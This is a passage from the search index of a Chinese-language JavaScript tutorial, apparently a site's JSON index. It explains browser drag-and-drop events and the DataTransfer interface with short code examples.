\u4e0d\u540c\u7684\u503c\u3002\u6ce8\u610f\uff0c\u7b2c\u4e00\u79cd\u683c\u5f0f\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u683c\u5f0f\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u65e0\u6cd5\u8bfb\u53d6\uff0c\u8fd9\u610f\u5473\u7740\uff0c\u53ea\u6709\u67d0\u4e2a\u90e8\u7f72\u4e86\u7279\u5b9a\u4ee3\u7801\u7684\u8282\u70b9\uff0c\u624d\u53ef\u80fd drop \uff08\u8bfb\u53d6\u5230\uff09\u8fd9\u4e2a\u6570\u636e\u3002 DataTransfer.getData() \u00b6 DataTransfer.getData() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u8868\u793a\u6570\u636e\u7c7b\u578b\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e8b\u4ef6\u6240\u5e26\u7684\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\uff08\u901a\u5e38\u662f\u7528 setData \u65b9\u6cd5\u6dfb\u52a0\u7684\u6570\u636e\uff09\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002\u901a\u5e38\u53ea\u6709 drop \u4e8b\u4ef6\u89e6\u53d1\u540e\uff0c\u624d\u80fd\u53d6\u51fa\u6570\u636e\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a drop \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u7528\u6765\u53d6\u51fa\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u3002 1 2 3 4 5 function onDrop ( event ) { var data = event . dataTransfer . getData ( 'text/plain' ); event . target . textContent = data ; event . preventDefault (); } \u4e0a\u9762\u4ee3\u7801\u53d6\u51fa\u62d6\u62c9\u4e8b\u4ef6\u7684\u6587\u672c\u6570\u636e\uff0c\u5c06\u5176\u66ff\u6362\u6210\u5f53\u524d\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002\u6ce8\u610f\uff0c\u8fd9\u65f6\u8fd8\u5fc5\u987b\u53d6\u6d88\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u884c\u4e3a\uff0c\u56e0\u4e3a\u5047\u5982\u7528\u6237\u62d6\u62c9\u7684\u662f\u4e00\u4e2a\u94fe\u63a5\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u4f1a\u5728\u5f53\u524d\u7a97\u53e3\u6253\u5f00\u8fd9\u4e2a\u94fe\u63a5\u3002 getData \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u5176\u4e2d\u5305\u542b\u591a\u9879\u6570\u636e\uff0c\u5c31\u5fc5\u987b\u624b\u52a8\u89e3\u6790\u3002 1 2 3 4 5 6 7 8 9 10 function doDrop ( event ) { var lines = event . dataTransfer . getData ( 'text/uri-list' ). split ( '\\n' ); for ( let line of lines ) { let link = document . createElement ( 'a' ); link . href = line ; link . textContent = line ; event . target . appendChild ( link ); } event . preventDefault (); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c getData \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u7ec4\u94fe\u63a5\uff0c\u5c31\u5fc5\u987b\u81ea\u884c\u89e3\u6790\u3002 \u7c7b\u578b\u503c\u6307\u5b9a\u4e3a URL \uff0c\u53ef\u4ee5\u53d6\u51fa\u7b2c\u4e00\u4e2a\u6709\u6548\u94fe\u63a5\u3002 1 var link = event . dataTransfer . getData ( 'URL' ); \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u4ece\u591a\u79cd\u7c7b\u578b\u7684\u6570\u636e\u91cc\u9762\u53d6\u51fa\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 function doDrop ( event ) { var types = event . dataTransfer . types ; var supportedTypes = [ 'text/uri-list' , 'text/plain' ]; types = supportedTypes . filter ( function ( value ) { types . includes ( value ) }); if ( types . length ) { var data = event . dataTransfer . getData ( types [ 0 ]); } event . preventDefault (); } DataTransfer.clearData() \u00b6 DataTransfer.clearData() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u8868\u793a\u6570\u636e\u7c7b\u578b\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u5220\u9664\u4e8b\u4ef6\u6240\u5e26\u7684\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7c7b\u578b\uff0c\u5219\u5220\u9664\u6240\u6709\u6570\u636e\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u4e0d\u5b58\u5728\uff0c\u5219\u8c03\u7528\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u6548\u679c\u3002 1 event . dataTransfer . clearData ( 'text/uri-list' ); \u4e0a\u9762\u4ee3\u7801\u6e05\u9664\u4e8b\u4ef6\u6240\u5e26\u7684 text/uri-list \u7c7b\u578b\u7684\u6570\u636e\u3002 \u8be5\u65b9\u6cd5\u4e0d\u4f1a\u79fb\u9664\u62d6\u62c9\u7684\u6587\u4ef6\uff0c\u56e0\u6b64\u8c03\u7528\u8be5\u65b9\u6cd5\u540e\uff0c DataTransfer.types \u5c5e\u6027\u53ef\u80fd\u4f9d\u7136\u4f1a\u8fd4\u56de Files \u7c7b\u578b\uff08\u524d\u63d0\u662f\u5b58\u5728\u6587\u4ef6\u62d6\u62c9\uff09\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 dragstart \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e4b\u4e2d\u4f7f\u7528\uff0c\u56e0\u4e3a\u8fd9\u662f\u62d6\u62c9\u64cd\u4f5c\u7684\u6570\u636e\u552f\u4e00\u53ef\u5199\u7684\u65f6\u673a\u3002 DataTransfer.setDragImage() \u00b6 \u62d6\u52a8\u8fc7\u7a0b\u4e2d\uff08 dragstart \u4e8b\u4ef6\u89e6\u53d1\u540e\uff09\uff0c\u6d4f\u89c8\u5668\u4f1a\u663e\u793a\u4e00\u5f20\u56fe\u7247\u8ddf\u968f\u9f20\u6807\u4e00\u8d77\u79fb\u52a8\uff0c\u8868\u793a\u88ab\u62d6\u52a8\u7684\u8282\u70b9\u3002\u8fd9\u5f20\u56fe\u7247\u662f\u81ea\u52a8\u521b\u9020\u7684\uff0c\u901a\u5e38\u663e\u793a\u4e3a\u88ab\u62d6\u52a8\u8282\u70b9\u7684\u5916\u89c2\uff0c\u4e0d\u9700\u8981\u81ea\u5df1\u52a8\u624b\u8bbe\u7f6e\u3002 DataTransfer.setDragImage() \u65b9\u6cd5\u53ef\u4ee5\u81ea\u5b9a\u4e49\u8fd9\u5f20\u56fe\u7247\u3002\u5b83\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u662f <img> \u8282\u70b9\u6216\u8005 <canvas> \u8282\u70b9\uff0c\u5982\u679c\u7701\u7565\u6216\u4e3a null \uff0c\u5219\u4f7f\u7528\u88ab\u62d6\u52a8\u7684\u8282\u70b9\u7684\u5916\u89c2\uff1b\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3a\u9f20\u6807\u76f8\u5bf9\u4e8e\u8be5\u56fe\u7247\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 /* HTML \u4ee3\u7801\u5982\u4e0b <div id=\"drag-with-image\" class=\"dragdemo\" draggable=\"true\"> drag me </div> */ var div = document . getElementById ( 'drag-with-image' ); div . addEventListener ( 'dragstart' , function ( e ) { var img = document . createElement ( 'img' ); img . src = 'http://path/to/img' ; e . dataTransfer . setDragImage ( img , 0 , 0 ); }, false );","title":"\u62d6\u62c9\u4e8b\u4ef6"},{"location":"events/drag/#_1","text":"","title":"\u62d6\u62c9\u4e8b\u4ef6"},{"location":"events/drag/#_2","text":"\u62d6\u62c9\uff08drag\uff09\u6307\u7684\u662f\uff0c\u7528\u6237\u5728\u67d0\u4e2a\u5bf9\u8c61\u4e0a\u6309\u4e0b\u9f20\u6807\u952e\u4e0d\u653e\uff0c\u62d6\u52a8\u5b83\u5230\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u91ca\u653e\u9f20\u6807\u952e\uff0c\u5c06\u8be5\u5bf9\u8c61\u653e\u5728\u90a3\u91cc\u3002 \u62d6\u62c9\u7684\u5bf9\u8c61\u6709\u597d\u51e0\u79cd\uff0c\u5305\u62ec\u5143\u7d20\u8282\u70b9\u3001\u56fe\u7247\u3001\u94fe\u63a5\u3001\u9009\u4e2d\u7684\u6587\u5b57\u7b49\u7b49\u3002\u5728\u7f51\u9875\u4e2d\uff0c\u9664\u4e86\u5143\u7d20\u8282\u70b9\u9ed8\u8ba4\u4e0d\u53ef\u4ee5\u62d6\u62c9\uff0c\u5176\u4ed6\uff08\u56fe\u7247\u3001\u94fe\u63a5\u3001\u9009\u4e2d\u7684\u6587\u5b57\uff09\u90fd\u53ef\u4ee5\u76f4\u63a5\u62d6\u62c9\u3002\u4e3a\u4e86\u8ba9\u5143\u7d20\u8282\u70b9\u53ef\u62d6\u62c9\uff0c\u53ef\u4ee5\u5c06\u8be5\u8282\u70b9\u7684 draggable \u5c5e\u6027\u8bbe\u4e3a true \u3002 1 2 3 < div draggable = \"true\" > \u6b64\u533a\u57df\u53ef\u62d6\u62c9 </ div > \u4e0a\u9762\u4ee3\u7801\u7684 div \u533a\u5757\uff0c\u5728\u7f51\u9875\u4e2d\u53ef\u4ee5\u76f4\u63a5\u7528\u9f20\u6807\u62d6\u52a8\u3002\u677e\u5f00\u9f20\u6807\u952e\u65f6\uff0c\u62d6\u52a8\u6548\u679c\u5c31\u4f1a\u6d88\u5931\uff0c\u8be5\u533a\u5757\u4f9d\u7136\u5728\u539f\u6765\u7684\u4f4d\u7f6e\u3002 draggable \u5c5e\u6027\u53ef\u7528\u4e8e\u4efb\u4f55\u5143\u7d20\u8282\u70b9\uff0c\u4f46\u662f\u56fe\u7247\uff08 <img> \uff09\u548c\u94fe\u63a5\uff08 <a> \uff09\u4e0d\u52a0\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u62d6\u62c9\u3002\u5bf9\u4e8e\u5b83\u4eec\uff0c\u7528\u5230\u8fd9\u4e2a\u5c5e\u6027\u7684\u65f6\u5019\uff0c\u5f80\u5f80\u662f\u5c06\u5176\u8bbe\u4e3a false \uff0c\u9632\u6b62\u62d6\u62c9\u8fd9\u4e24\u79cd\u5143\u7d20\u3002 \u6ce8\u610f\uff0c\u4e00\u65e6\u67d0\u4e2a\u5143\u7d20\u8282\u70b9\u7684 draggable \u5c5e\u6027\u8bbe\u4e3a true \uff0c\u5c31\u65e0\u6cd5\u518d\u7528\u9f20\u6807\u9009\u4e2d\u8be5\u8282\u70b9\u5185\u90e8\u7684\u6587\u5b57\u6216\u5b50\u8282\u70b9\u4e86\u3002 \u5f53\u5143\u7d20\u8282\u70b9\u6216\u9009\u4e2d\u7684\u6587\u672c\u88ab\u62d6\u62c9\u65f6\uff0c\u5c31\u4f1a\u6301\u7eed\u89e6\u53d1\u62d6\u62c9\u4e8b\u4ef6\uff0c\u5305\u62ec\u4ee5\u4e0b\u4e00\u4e9b\u4e8b\u4ef6\u3002 drag \uff1a\u62d6\u62c9\u8fc7\u7a0b\u4e2d\uff0c\u5728\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u4e0a\u6301\u7eed\u89e6\u53d1\uff08\u76f8\u9694\u51e0\u767e\u6beb\u79d2\uff09\u3002 dragstart \uff1a\u7528\u6237\u5f00\u59cb\u62d6\u62c9\u65f6\uff0c\u5728\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u4e0a\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u3002\u901a\u5e38\u5e94\u8be5\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\uff0c\u6307\u5b9a\u62d6\u62c9\u7684\u6570\u636e\u3002 dragend \uff1a\u62d6\u62c9\u7ed3\u675f\u65f6\uff08\u91ca\u653e\u9f20\u6807\u952e\u6216\u6309\u4e0b ESC \u952e\uff09\u5728\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u4e0a\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u3002\u5b83\u4e0e dragstart \u4e8b\u4ef6\uff0c\u5728\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\u89e6\u53d1\u3002\u4e0d\u7ba1\u62d6\u62c9\u662f\u5426\u8de8\u7a97\u53e3\uff0c\u6216\u8005\u4e2d\u9014\u88ab\u53d6\u6d88\uff0c dragend \u4e8b\u4ef6\u603b\u662f\u4f1a\u89e6\u53d1\u7684\u3002 dragenter \uff1a\u62d6\u62c9\u8fdb\u5165\u5f53\u524d\u8282\u70b9\u65f6\uff0c\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u89e6\u53d1\u4e00\u6b21\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u5f53\u524d\u8282\u70b9\u3002\u901a\u5e38\u5e94\u8be5\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\uff0c\u6307\u5b9a\u662f\u5426\u5141\u8bb8\u5728\u5f53\u524d\u8282\u70b9\u653e\u4e0b\uff08drop\uff09\u62d6\u62c9\u7684\u6570\u636e\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u8be5\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u6216\u8005\u76d1\u542c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\uff0c\u5c31\u610f\u5473\u7740\u4e0d\u5141\u8bb8\u5728\u5f53\u524d\u8282\u70b9\u653e\u4e0b\u6570\u636e\u3002\u5728\u89c6\u89c9\u4e0a\u663e\u793a\u62d6\u62c9\u8fdb\u5165\u5f53\u524d\u8282\u70b9\uff0c\u4e5f\u662f\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u8bbe\u7f6e\u3002 dragover \uff1a\u62d6\u62c9\u5230\u5f53\u524d\u8282\u70b9\u4e0a\u65b9\u65f6\uff0c\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u6301\u7eed\u89e6\u53d1\uff08\u76f8\u9694\u51e0\u767e\u6beb\u79d2\uff09\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u5f53\u524d\u8282\u70b9\u3002\u8be5\u4e8b\u4ef6\u4e0e dragenter \u4e8b\u4ef6\u7684\u533a\u522b\u662f\uff0c dragenter \u4e8b\u4ef6\u5728\u8fdb\u5165\u8be5\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u7136\u540e\u53ea\u8981\u6ca1\u6709\u79bb\u5f00\u8fd9\u4e2a\u8282\u70b9\uff0c dragover \u4e8b\u4ef6\u4f1a\u6301\u7eed\u89e6\u53d1\u3002 dragleave \uff1a\u62d6\u62c9\u64cd\u4f5c\u79bb\u5f00\u5f53\u524d\u8282\u70b9\u8303\u56f4\u65f6\uff0c\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u7684 target \u5c5e\u6027\u662f\u5f53\u524d\u8282\u70b9\u3002\u5982\u679c\u8981\u5728\u89c6\u89c9\u4e0a\u663e\u793a\u62d6\u62c9\u79bb\u5f00\u64cd\u4f5c\u5f53\u524d\u8282\u70b9\uff0c\u5c31\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u8bbe\u7f6e\u3002 drop \uff1a\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u6216\u9009\u4e2d\u7684\u6587\u672c\uff0c\u91ca\u653e\u5230\u76ee\u6807\u8282\u70b9\u65f6\uff0c\u5728\u76ee\u6807\u8282\u70b9\u4e0a\u89e6\u53d1\u3002\u6ce8\u610f\uff0c\u5982\u679c\u5f53\u524d\u8282\u70b9\u4e0d\u5141\u8bb8 drop \uff0c\u5373\u4f7f\u5728\u8be5\u8282\u70b9\u4e0a\u65b9\u677e\u5f00\u9f20\u6807\u952e\uff0c\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002\u5982\u679c\u7528\u6237\u6309\u4e0b ESC \u952e\uff0c\u53d6\u6d88\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002\u8be5\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u8d1f\u8d23\u53d6\u51fa\u62d6\u62c9\u6570\u636e\uff0c\u5e76\u8fdb\u884c\u76f8\u5173\u5904\u7406\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u5c55\u793a\uff0c\u5982\u4f55\u52a8\u6001\u6539\u53d8\u88ab\u62d6\u52a8\u8282\u70b9\u7684\u80cc\u666f\u8272\u3002 1 2 3 4 5 6 7 div . addEventListener ( 'dragstart' , function ( e ) { this . style . backgroundColor = 'red' ; }, false ); div . addEventListener ( 'dragend' , function ( e ) { this . style . backgroundColor = 'green' ; }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c div \u8282\u70b9\u88ab\u62d6\u52a8\u65f6\uff0c\u80cc\u666f\u8272\u4f1a\u53d8\u4e3a\u7ea2\u8272\uff0c\u62d6\u52a8\u7ed3\u675f\uff0c\u53c8\u53d8\u56de\u7eff\u8272\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5c55\u793a\u5982\u4f55\u5b9e\u73b0\u5c06\u4e00\u4e2a\u8282\u70b9\u4ece\u5f53\u524d\u7236\u8282\u70b9\uff0c\u62d6\u62c9\u5230\u53e6\u4e00\u4e2a\u7236\u8282\u70b9\u4e2d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 /* HTML \u4ee3\u7801\u5982\u4e0b <div class=\"dropzone\"> <div id=\"draggable\" draggable=\"true\"> \u8be5\u8282\u70b9\u53ef\u62d6\u62c9 </div> </div> <div class=\"dropzone\"></div> <div class=\"dropzone\"></div> <div class=\"dropzone\"></div> */ // \u88ab\u62d6\u62c9\u8282\u70b9 var dragged ; document . addEventListener ( 'dragstart' , function ( event ) { // \u4fdd\u5b58\u88ab\u62d6\u62c9\u8282\u70b9 dragged = event . target ; // \u88ab\u62d6\u62c9\u8282\u70b9\u7684\u80cc\u666f\u8272\u53d8\u900f\u660e event . target . style . opacity = 0.5 ; }, false ); document . addEventListener ( 'dragend' , function ( event ) { // \u88ab\u62d6\u62c9\u8282\u70b9\u7684\u80cc\u666f\u8272\u6062\u590d\u6b63\u5e38 event . target . style . opacity = '' ; }, false ); document . addEventListener ( 'dragover' , function ( event ) { // \u9632\u6b62\u62d6\u62c9\u6548\u679c\u88ab\u91cd\u7f6e\uff0c\u5141\u8bb8\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u653e\u5165\u76ee\u6807\u8282\u70b9 event . preventDefault (); }, false ); document . addEventListener ( 'dragenter' , function ( event ) { // \u76ee\u6807\u8282\u70b9\u7684\u80cc\u666f\u8272\u53d8\u7d2b\u8272 // \u7531\u4e8e\u8be5\u4e8b\u4ef6\u4f1a\u5192\u6ce1\uff0c\u6240\u4ee5\u8981\u8fc7\u6ee4\u8282\u70b9 if ( event . target . className === 'dropzone' ) { event . target . style . background = 'purple' ; } }, false ); document . addEventListener ( 'dragleave' , function ( event ) { // \u76ee\u6807\u8282\u70b9\u7684\u80cc\u666f\u8272\u6062\u590d\u539f\u6837 if ( event . target . className === 'dropzone' ) { event . target . style . background = '' ; } }, false ); document . addEventListener ( 'drop' , function ( event ) { // \u9632\u6b62\u4e8b\u4ef6\u9ed8\u8ba4\u884c\u4e3a\uff08\u6bd4\u5982\u67d0\u4e9b\u5143\u7d20\u8282\u70b9\u4e0a\u53ef\u4ee5\u6253\u5f00\u94fe\u63a5\uff09\uff0c event . preventDefault (); if ( event . target . className === 'dropzone' ) { // \u6062\u590d\u76ee\u6807\u8282\u70b9\u80cc\u666f\u8272 event . target . style . background = '' ; // \u5c06\u88ab\u62d6\u62c9\u8282\u70b9\u63d2\u5165\u76ee\u6807\u8282\u70b9 dragged . parentNode . removeChild ( dragged ); event . target . appendChild ( dragged ); } }, false ); \u5173\u4e8e\u62d6\u62c9\u4e8b\u4ef6\uff0c\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6ce8\u610f\u70b9\u3002 \u62d6\u62c9\u8fc7\u7a0b\u53ea\u89e6\u53d1\u4ee5\u4e0a\u8fd9\u4e9b\u62d6\u62c9\u4e8b\u4ef6\uff0c\u5c3d\u7ba1\u9f20\u6807\u5728\u79fb\u52a8\uff0c\u4f46\u662f\u9f20\u6807\u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\u3002 \u5c06\u6587\u4ef6\u4ece\u64cd\u4f5c\u7cfb\u7edf\u62d6\u62c9\u8fdb\u6d4f\u89c8\u5668\uff0c\u4e0d\u4f1a\u89e6\u53d1 dragstart \u548c dragend \u4e8b\u4ef6\u3002 dragenter \u548c dragover \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u7528\u6765\u53d6\u51fa\u62d6\u62c9\u7684\u6570\u636e\uff08\u5373\u5141\u8bb8\u653e\u4e0b\u88ab\u62d6\u62c9\u7684\u5143\u7d20\uff09\u3002\u7531\u4e8e\u7f51\u9875\u7684\u5927\u90e8\u5206\u533a\u57df\u4e0d\u9002\u5408\u4f5c\u4e3a\u653e\u4e0b\u62d6\u62c9\u5143\u7d20\u7684\u76ee\u6807\u8282\u70b9\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5f53\u524d\u8282\u70b9\u4e0d\u5141\u8bb8\u63a5\u53d7\u88ab\u62d6\u62c9\u7684\u5143\u7d20\u3002\u5982\u679c\u60f3\u8981\u5728\u76ee\u6807\u8282\u70b9\u4e0a\u653e\u4e0b\u7684\u6570\u636e\uff0c\u9996\u5148\u5fc5\u987b\u963b\u6b62\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002 1 2 < div ondragover = \"return false\" > < div ondragover = \"event.preventDefault()\" > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e0d\u53d6\u6d88\u62d6\u62c9\u4e8b\u4ef6\u6216\u8005\u963b\u6b62\u9ed8\u8ba4\u884c\u4e3a\uff0c\u5c31\u4e0d\u80fd\u5728 div \u8282\u70b9\u4e0a\u653e\u4e0b\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u3002","title":"\u62d6\u62c9\u4e8b\u4ef6\u7684\u79cd\u7c7b"},{"location":"events/drag/#dragevent","text":"\u62d6\u62c9\u4e8b\u4ef6\u90fd\u7ee7\u627f\u4e86 DragEvent \u63a5\u53e3\uff0c\u8fd9\u4e2a\u63a5\u53e3\u53c8\u7ee7\u627f\u4e86 MouseEvent \u63a5\u53e3\u548c Event \u63a5\u53e3\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a DragEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u62d6\u62c9\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 new DragEvent ( type , options ) DragEvent() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u7c7b\u578b\uff0c\u8be5\u53c2\u6570\u5fc5\u987b\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7684\u914d\u7f6e\u5bf9\u8c61\uff0c\u7528\u6765\u8bbe\u7f6e\u4e8b\u4ef6\u7684\u5c5e\u6027\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u914d\u7f6e\u5bf9\u8c61\u9664\u4e86\u63a5\u53d7 MouseEvent \u63a5\u53e3\u548c Event \u63a5\u53e3\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u8bbe\u7f6e dataTransfer \u5c5e\u6027\u8981\u4e48\u662f null \uff0c\u8981\u4e48\u662f\u4e00\u4e2a DataTransfer \u63a5\u53e3\u7684\u5b9e\u4f8b\u3002 DataTransfer \u7684\u5b9e\u4f8b\u5bf9\u8c61\u7528\u6765\u8bfb\u5199\u62d6\u62c9\u4e8b\u4ef6\u4e2d\u4f20\u8f93\u7684\u6570\u636e\uff0c\u8be6\u89c1\u4e0b\u6587\u300aDataTransfer \u63a5\u53e3\u300b\u7684\u90e8\u5206\u3002","title":"DragEvent \u63a5\u53e3"},{"location":"events/drag/#datatransfer","text":"\u6240\u6709\u62d6\u62c9\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u90fd\u6709\u4e00\u4e2a DragEvent.dataTransfer \u5c5e\u6027\uff0c\u7528\u6765\u8bfb\u5199\u9700\u8981\u4f20\u9012\u7684\u6570\u636e\u3002\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\u662f\u4e00\u4e2a DataTransfer \u63a5\u53e3\u7684\u5b9e\u4f8b\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a DataTransfer() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 DataTransfer \u5b9e\u4f8b\u5bf9\u8c61\u3002 1 var dataTrans = new DataTransfer (); DataTransfer() \u6784\u9020\u51fd\u6570\u4e0d\u63a5\u53d7\u53c2\u6570\u3002 \u62d6\u62c9\u7684\u6570\u636e\u5206\u6210\u4e24\u65b9\u9762\uff1a\u6570\u636e\u7684\u79cd\u7c7b\uff08\u53c8\u79f0\u683c\u5f0f\uff09\u548c\u6570\u636e\u7684\u503c\u3002\u6570\u636e\u7684\u79cd\u7c7b\u662f\u4e00\u4e2a MIME \u5b57\u7b26\u4e32\uff08\u6bd4\u5982 text/plain \u3001 image/jpeg \uff09\uff0c\u6570\u636e\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u62d6\u62c9\u4e00\u6bb5\u6587\u672c\uff0c\u5219\u6570\u636e\u9ed8\u8ba4\u5c31\u662f\u90a3\u6bb5\u6587\u672c\uff1b\u5982\u679c\u62d6\u62c9\u4e00\u4e2a\u94fe\u63a5\uff0c\u5219\u6570\u636e\u9ed8\u8ba4\u5c31\u662f\u94fe\u63a5\u7684 URL\u3002 \u62d6\u62c9\u4e8b\u4ef6\u5f00\u59cb\u65f6\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u63d0\u4f9b\u6570\u636e\u7c7b\u578b\u548c\u6570\u636e\u503c\u3002\u62d6\u62c9\u8fc7\u7a0b\u4e2d\uff0c\u5f00\u53d1\u8005\u901a\u8fc7 dragenter \u548c dragover \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u68c0\u67e5\u6570\u636e\u7c7b\u578b\uff0c\u4ee5\u786e\u5b9a\u662f\u5426\u5141\u8bb8\u653e\u4e0b\uff08drop\uff09\u88ab\u62d6\u62c9\u7684\u5bf9\u8c61\u3002\u6bd4\u5982\uff0c\u5728\u53ea\u5141\u8bb8\u653e\u4e0b\u94fe\u63a5\u7684\u533a\u57df\uff0c\u68c0\u67e5\u62d6\u62c9\u7684\u6570\u636e\u7c7b\u578b\u662f\u5426\u4e3a text/uri-list \u3002 \u53d1\u751f drop \u4e8b\u4ef6\u65f6\uff0c\u76d1\u542c\u51fd\u6570\u53d6\u51fa\u62d6\u62c9\u7684\u6570\u636e\uff0c\u5bf9\u5176\u8fdb\u884c\u5904\u7406\u3002","title":"DataTransfer \u63a5\u53e3\u6982\u8ff0"},{"location":"events/drag/#datatransfer_1","text":"","title":"DataTransfer \u7684\u5b9e\u4f8b\u5c5e\u6027"},{"location":"events/drag/#datatransferdropeffect","text":"DataTransfer.dropEffect 